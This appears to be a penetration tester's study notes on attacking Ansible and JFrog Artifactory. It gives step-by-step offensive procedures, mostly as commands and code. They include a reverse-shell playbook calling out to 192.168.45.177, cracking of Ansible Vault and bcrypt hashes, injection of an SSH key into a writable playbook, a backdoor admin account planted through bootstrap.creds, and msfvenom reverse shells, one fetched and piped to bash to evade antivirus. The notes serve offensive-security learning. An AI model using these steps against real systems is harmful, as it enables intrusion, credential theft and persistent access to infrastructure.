---
title: DevOps
draft: false
tags:
---
 
# Ansible

_Ansible_ is an infrastructure configuration engine that enables IT personnel to dynamically and automatically configure IT infrastructure and computing resources. [Ansible modules](https://docs.ansible.com/ansible/latest/user_guide/modules_intro.html) are specialized Python scripts that are transported to the nodes by Ansible and then run to perform certain actions (configure settings, run commands, etc).

In order for a machine to be set up as a node for an Ansible controller, it needs to be part of the [Ansible inventory](https://docs.ansible.com/ansible/latest/user_guide/intro_inventory.html) on the controller server, normally located at **/etc/ansible/hosts**

For actions to be performed on the node, either the password for a user on the node needs to be stored on the controller, or the controller's Ansible account needs to be configured on the node using SSH keys.

Because the Ansible server needs elevated privileges to perform certain tasks on the end node, the user configured by [Ansible typically](https://docs.ansible.com/ansible/latest/user_guide/become.html) has _root_ or _sudo_-level permissions.

## Enumerate Ansible

Enumerate if Ansible is installed on the system.

- Enumerate the inventory file:
```bash
cat /etc/ansible/hosts
```

- Enumerate if ansible is installed on the system:
```
$ ansible
```

Other indicators:
- Ansible configuration file path: `/etc/ansible`
- Presence of "ansible" related users on the `/etc/passwd` file
- Identify Ansible Nodes
- Check for the list of home folders (user accounts for performing Ansible actions)
- Inspect Ansible related log messages in the **syslog** file

## Ad-hoc Commands

Node actions can be initiated from an Ansible controller in two primary ways. The first is through [ad-hoc commands](https://docs.ansible.com/ansible/latest/user_guide/intro_adhoc.html), and the second involves the use of [playbooks](https://docs.ansible.com/ansible/latest/user_guide/playbooks.html). Let's begin with ad-hoc commands.

Ad-hoc commands are simple shell commands to be run on all, or a subset, of machines in the Ansible inventory. This commands typically are not repeated (executed only once), unlike the Ansible playbooks which are meant to be executed multiple times.

- Execute Ad-hoc command:
```bash
$ ansible ANSIBLE_GROUP -a "COMMAND"

# Parameters:
# ANSIBLE_GROUP: host group inside the inventory file ([victims])
# -a "COMMAND": command to execute in all the hosts belonging to the host group
```

- Execute Ad-hoc command as a different user:
```bash
$ ansible ANSIBLE_GROUP -a "COMMAND" --become USER

# Parameters:
--become USER: user to run the command in the target machines (default is root)
```

## Ansible Playbooks

Playbooks allow sets of tasks to be scripted so they can be run routinely at points in time.

Create a simple playbook called **getinfo.yml**:
```yml
---
- name: Get system info
  hosts: all
  gather_facts: true
  tasks:
    - name: Display info
      debug:
          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
```

Reverse shell playbook:
```yml
---
- name: RCE 
  hosts: all
  gather_facts: true
  tasks:
	- name: Run command
      shell: bash -c 'bash -i >& /dev/tcp/192.168.45.177/443 0>&1'
      async: 10
      poll: 0
```

Run the playbook:
```bash
$ ansible-playbook getinfo.yml
```

## Exploiting Playbooks for Ansible Credentials

If we have root access or access to the Ansible administrator account on the Ansible controller, we can run ad-hoc commands or playbooks as the Ansible user on all nodes, typically with elevated or root access.

If Ansible is set up to use SSH for authentication to nodes, we could steal the Ansible administrator user's private key from their home folder and log in to the nodes directly. All these are options if we're already _root_ on the controller.

> [!Info]
> Often the private keys used by Ansible do not contain passphrases as Ansible configuration is intended to be run in an automated fashion.

Search for hardcoded credentials in playbooks if we have access to the folders they are stored in:
```yaml
---
- name: Write a file as offsec
  hosts: all
  gather_facts: true
  become: yes
  become_user: offsec
  vars:
    ansible_become_pass: lab
  tasks:
    - copy:
          content: "This is my offsec content"
          dest: "/home/offsec/written_by_ansible.txt"
          mode: 0644
          owner: offsec
          group: offsec
```

Ansible does have newer features such as [_Ansible Vault_](https://docs.ansible.com/ansible/latest/user_guide/vault.html), which allows for secure storage of credentials for use in playbooks. Ansible Vault allows the user to encrypt or decrypt files or strings using a password:
```yaml
ansible_become_pass: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          39363631613935326235383232616639613231303638653761666165336131313965663033313232
          3736626166356263323964366533656633313230323964300a323838373031393362316534343863
          36623435623638373636626237333163336263623737383532663763613534313134643730643532
          3132313130313534300a383762366333303666363165383962356335383662643765313832663238
          3036
```

Copy the section of the encrypted payload above starting with "$ANSIBLE_VAULT" and attempt to crack it offline:

1. Place the encrypted payload in a YML file

> [!Note]
> The original encrypted string needs to be in the same format as shown above, but without any leading whitespace shown or it will fail with parsing errors (remove all the blank spaces in front of each line, but not the new lines)

2. Convert the encrypted payload into a JTR format:
```bash
$ ansible2john.py ./test.yml
test.yml:$ansible$0*0*9661a952b5822af9a21068e7afae3a119ef0312276baf5bc29d6e3ef312029d0*87b6c306f61e89b5c586bd7e182f2806*28870193b1e448c6b45b68766bb731c3bcb77852f7ca54114d70d52121101540
```

3. Copy the payload starting from the `:` onwards and place it into a txt file. Run hashcat to crack the password:
```bash
$ hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
```

4. Copy the original encrypted vault string into a text file and pipe it to **ansible-vault decrypt**. Enter the vault password to retrieve the password for the playbook user:
```bash
$ cat pw.txt
$ANSIBLE_VAULT;1.1;AES256
39363631613935326235383232616639613231303638653761666165336131313965663033313232
3736626166356263323964366533656633313230323964300a323838373031393362316534343863
36623435623638373636626237333163336263623737383532663763613534313134643730643532
3132313130313534300a383762366333303666363165383962356335383662643765313832663238
3036

$ cat pw.txt | ansible-vault decrypt
Vault password: # put the decrypted password
lab # this is the playbook user password retrieved from Vault
Decryption successful
```

> [!Note]
> Decrypting encrypted files is the same process.

## Weak Permissions on Ansible Playbooks

Take advantage of playbooks that we have write access to or if we can find a way to write to them (through an exploit), we can inject tasks that will then be run the next time the playbook is run.

Users that belong to the "ansible" group or related, might have write access to the **playbooks** folder through group permissions.

We could modify a playbook and add some malicious tasks like granting us access via SSH:
```yaml
---
- name: Get system info
  hosts: all
  gather_facts: true
  become: yes # add the become value to run as root
  tasks:
    - name: Display info
      debug:
          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"

    - name: Create a directory if it does not exist
      file:
        path: /root/.ssh
        state: directory
        mode: '0700'
        owner: root
        group: root

    - name: Create authorized keys if it does not exist
      file:
        path: /root/.ssh/authorized_keys
        state: touch
        mode: '0600'
        owner: root
        group: root

    - name: Update keys
      lineinfile:
        path: /root/.ssh/authorized_keys
        line: "SSH_PUBLIC_KEY_HERE"
        insertbefore: EOF # append to the end of the file
```

After, we can SSH into the hosts where the playbook is run as root:
```
ssh root@HOST
```

We could also run shell commands directly in tasks:
```yaml
    - name: Run command
      shell: touch /tmp/mycreatedfile.txt
      async: 10 # run the command asyncronously
      poll: 0 # not poll the process for results and just let it run on its own until the execution of the playbook is complete
```

## Sensitive Data Leakage via Ansible Modules

Some modules leak data to [**/var/log/syslog**](https://en.wikipedia.org/wiki/Syslog) in the form of module parameters.

For example, lets say we have the following playbook which is is readable only for the Ansible administrator user and root:
```yaml
$ cat mysqlbackup.yml 
---
- name: Backup TPS reports
  hosts: linuxvictim
  gather_facts: true
  become: yes
  tasks:
    - name: Run command
      shell: mysql --user=root --password=hotdog123 --host=databaseserver --databases tpsreports --result-file=/root/reportsbackup
      async: 10 
      poll: 0
```

The script attempts to create a backup of a database in a remote server and store the backup on a file in the remote machine. The playbook isnt readable but we can see that the credentials are hardcoded. 

Because of how it is executed, the playbook will log the shell command to syslog by default (in the target machine, not the controller node). To avoid this, we can set the _no_log_ option to _true_ in the playbook.

We can check the syslog contents in the target nodes to dump the commands executed by the playbook:
```bash
cat /var/log/syslog
```

---
# Artifactory

[_Artifactory_](https://jfrog.com/artifactory/) is a "binary repository manager" that stores software packages and other binaries. Users with write access to Artifactory can place packages or binaries in the Artifactory server.

Because Artifactory is meant to be a single source for acquiring necessary binaries, it is a prime target for [supply chain compromise attacks](https://attack.mitre.org/techniques/T1195/). If an attacker can compromise the Artifactory server or get access to an Artifactory user's account that has write access to important packages, there is potential to compromise many users.

Setup:
```bash
# Start artifactory service
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start

# Stop artifactory service
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
```

## Artifactory Enumeration

Determine if an Artifactory repository is running on a target system:

- If we have access to the target machine:
```
ps aux | grep artifactory
```

- If we dont have access to the target machine, we can try accessing the server externally from a web browser at port 8081 (default port for Artifactory's web interface) or 8082.

## Compromising Artifactory Backups

Artifactory has its own authentication mechanism (username and password) and we might not have access even if we have root access to the target machine.

Artifactory stores its user information, such as usernames and encrypted passwords in databases. Depending on the configuration, [Artifactory creates backups](https://www.jfrog.com/confluence/display/JFROG/Backups) of its databases. 

> [!Requirements]
> High Privileged access to the target system running Artifactory (we might not be able to list the DB path).

The open-source version of Artifactory creates database backups for the user accounts in JSON format at:
`/<ARTIFACTORY FOLDER>/var/backup/access`

1. List database entries:
```bash
/opt/jfrog/artifactory/var/backup/access$ cat access.backup.20200730120454.json
...
{
    "username" : "developer",
    "firstName" : null,
    "lastName" : null,
    "email" : "developer@corp.local",
    "realm" : "internal",
    "status" : "enabled",
    "lastLoginTime" : 0,
    "lastLoginIp" : null,
    "password" : "bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm",
    "allowedIps" : [ "*" ],
    "created" : 1591715957889,
    "modified" : 1591715957889,
    "failedLoginAttempts" : 0,
    "statusLastModified" : 1591715957889,
    "passwordLastModified" : 1591715957889,
    "customData" : {
      "updatable_profile" : {
        "value" : "true",
        "sensitive" : false
      }
...
```

These files have full entries for each user along with their passwords hashed in [bcrypt](https://en.wikipedia.org/wiki/Bcrypt) format.

2. Copy the Bcrypt hash into a txt file and remove the `bcrypt$` from the beginning.

3. Crack the password:
```bash
sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Compromising Artifactory's Database

If there are no backup files available, we can access the database itself or attempt to copy it and extract the hashes manually.

> [!Requirements]
> High Privileged access to the target system running Artifactory (we might not be able to list the DB path).

The open-source version of artifactory locks the database while the server is running. Third-party databases do not always have this restriction. If we can gain access to the database, it may be possible to create users manually by creating new records in the [users table](https://www.jfrog.com/confluence/display/JFROG/PostgreSQL).

In case the database is locked, we can copy the entire database to a new location:

> [!Note]
> Open-Source Artifactory utilizes an Apache Derby Database by default. Paid versions use the Porgresql database. Depending on the database, we have to copy the corresponding files and after access the database with the corresponding tools.

1. Create a temporal directory to contain the database:
```bash
mkdir /tmp/hackeddb
```

2. Copy the database from the original location to the temporal directory:
```bash
sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb
```

3. Give the necessary permissions to the database copy:
```bash
sudo chmod 755 /tmp/hackeddb/derby
```

4. Remove any locked files that existed from the DB being in use when it was copied:
```bash
sudo rm /tmp/hackeddb/derby/*.lck
```

5. Use Artifactory Java to connect to the database (Derby in this case):
```bash
sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij

ij> connect 'jdbc:derby:/tmp/hackeddb/derby';
```

> [!Note]
> Apache derby utilities to connect to the Database (ij) can be [downloaded](http://db.apache.org/derby/releases/release-10.15.1.3.html) if necessary.

6. List the all the users and hashed passwords:
```sql
ij> select * from access_users;
```

7. Copy the Bcrypt hashes into a txt file and crack the passwords:
```bash
sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Adding a Secondary Artifactory Admin Account

We can also gain access to Artifactory by adding a secondary administrator account through a built-in backdoor. If an administrator account is corrupted, or they lose access to the system, Artifactory offers an alternative option for gaining administrative access.

This method requires write access to the **/opt/jfrog/artifactory/var/etc/access** folder and the ability to change permissions on the newly created file, which usually requires _root_ or _sudo_ access.

> [!Requirements]
> Root access to the target machine running Artifactory.

0. Access to the target machine running artifactory as a high privileged user.

1. Create the following file with the following content **as root or using sudo** to create the backup admin user:
```bash
cd /opt/jfrog/artifactory/var/etc/access

sudo vim bootstrap.creds

# Content:
haxmin@*=haxhaxhax
```

This will create a new user called "haxmin" with a password of "haxhaxhax"

2. Give the necessary permissions:
```bash
sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
```

3. Restart the Artifactory process:
```bash
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop

sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
```

After this, Artifactory will load our bootstrap credential file and process the new user.

4. Verify the creation of the new user:
```bash
sudo grep "Create admin user" /opt/jfrog/artifactory/var/log/console.log

2020-05-15T19:22:24.963Z [jfac ] [INFO ] [c576b641d3d536c8] [a.s.b.AccessAdminBootstrap:160] [ocalhost-startStop-2] - [ACCESS BOOTSTRAP] Create admin user 'haxmin'
```

5. Navigate to `http://ART_URL:8081/8082` and login using the new credentials.

## Artifactory Reverse Shell

Once we have access to artifactory, we can upload a reverse shell binary and download it from a different host:

1. Create a reverse:
```bash
msfvenom LHOST=192.168.45.177 LPORT=443 -p linux/x64/meterpreter/reverse_tcp -f elf -o shell
```

2. Upload it to Artifactory under the generic-local folder.

3. Download it from the target machine:
```bash
curl -u ART_USER:ART_PASS -o shell "http://controller:8082/artifactory/generic-local/shell"
```

> [!Note]
> The "URL to File" property can be extracted from Artifactory if we click on the uploaded file.

4. Give the necessary permissions:
```bash
chmod +x shell
```

5. Setup a listener and execute it:
```bash
./shell
```

**AV Evasion**

1. Create a reverse:
```bash
msfvenom LHOST=192.168.45.177 LPORT=443 -p linux/x64/meterpreter/reverse_tcp -f sh -o shell.sh
```

2. Upload it to Artifactory under the generic-local folder.

3. Execute the shell directly without saving it to memory:
```bash
curl -fsSL -u ART_USER:ART_PASS "http://controller:8082/artifactory/generic-local/shell.sh" | bash
```

TODO: revisar porque no se obtiene la shell

